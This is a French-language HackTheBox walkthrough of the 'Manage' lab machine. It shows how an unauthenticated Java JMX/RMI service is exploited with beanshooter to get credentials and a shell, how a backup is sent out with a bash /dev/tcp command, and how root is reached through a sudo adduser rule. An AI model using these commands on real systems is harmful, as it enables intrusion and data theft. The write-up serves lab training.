---
title:
description:
tags:
  - HTB
  - machine
date: 2026-03-24T20:46
tasks:
  - format
parent file:
  - 
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "8"
seasonal: no
---

# Foothold

On commence par nmap
```
nmap -sCV -T4 $box -oN nmap.out
```
nous montre des ports peu orthodoxes.
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 15:52 -0400
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.033s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp open  java-rmi Java RMI
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:36971
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
8080/tcp open  http     Apache Tomcat 10.1.19
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.1.19
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.08 seconds
```

On se connecte sur le site et on trouve un site apache tomcat pas configuré. En revanche, même avec la version du tomcat (10.1.19), on ne trouve aucune vulnérabilité. Via la page de hacktricks sur le pentest de java-rmi, on trouve [une page github](https://github.com/qtc-de/remote-method-guesser?tab=readme-ov-file#installation) pour un script qui permette de pentest tout ça.

Sur les conseils de hackthebox on utilise [beanshooter](https://github.com/qtc-de/beanshooter) pour énumérer les utilisateurs.
```
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar enum manage.htb 2222
```
et on trouve
```
[+] Checking available bound names:
[+]
[+]     * jmxrmi (JMX endpoint: 127.0.1.1:36803)
[+]
[+] Checking for unauthorized access:
[+]
[+]     - Remote MBean server does not require authentication.
[+]       Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+]     - Remote MBeanServer rejected the payload class.
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+]     - 189 MBeans are currently registred on the MBean server.
[+]       Listing 167 non default MBeans:
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)

...

[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)
[+]
[+] Enumerating tomcat users:
[+]
[+]     - Listing 2 tomcat users:
[+]
[+]             ----------------------------------------
[+]             Username:  manager
[+]             Password:  fhErvo2r9wuTEYiYgt
[+]             Roles:
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+]             ----------------------------------------
[+]             Username:  admin
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
[+]             Roles:
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

On voit aussi que jmx ne nécessite pas de creds pour se connecter. On commence par déployer un mbean sur la cible
```
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard manage.htb 2222 tonka
```

Et ensuite on l'utilise pour obtenir un shell.
```
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.htb 2222   
```

Et avec ça on a notre premier accès.
![[Pasted image 20260330135527.png]]

# Privilege Escalation to user

Avec cet utilisateur on peut voir rapidement le flag `/opt/tomcat/user.txt`, voilà notre premier flag.

Le premier accès obtenu, on commence par chercher à obtenir notre accès utilisateur. En regardant dans les folders de `/home`, on voit que l'un des deux utilisateurs a un fichier tar.gz stocké. On lance un listener sur notre machine
```
nc -nlvp 4443 > backup.tar.gz
```
Et on se l'envoie
```
bash -c 'cat /home/useradmin/backups/backup.tar.gz >& /dev/tcp/10.10.15.35/4443 0>&1'
```

Sur la machine on extrait le fichier et on lit le contenu.
![[Pasted image 20260330135653.png]]

On tente d'utiliser le fichier `.ssh/id_ed25529` pour se connecter mais le ssh demande un code de vérification. On fouille un peu et on voit que l'on a aussi obtenu un fichier `.google_authenticator`. En regardant à l'intérieur on voit une suite de codes. on tente d'en rentrer un et bingo, on obtient un accès user!
![[Pasted image 20260330135819.png]]

# PrivEsc to root

Evidemment on commence par un 
```
sudo -l
```

Et on trouve assez vite que l'on a le droit d'ajouter un utilisateur, quelle aubaine!
```
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

En fait il faut le savoir, ubuntu a un utiliser `admin` qui a par défaut toutes les permissions de root, mais si l'on regarde ici, on ne trouve pas de tel utilisateur, on peut donc le créer et facilement accéder à un utilisateur avec les droits root.

![[Pasted image 20260330163416.png]]

Et voilà, on a nos deux flags

![[Pasted image 20260330163656.png]]

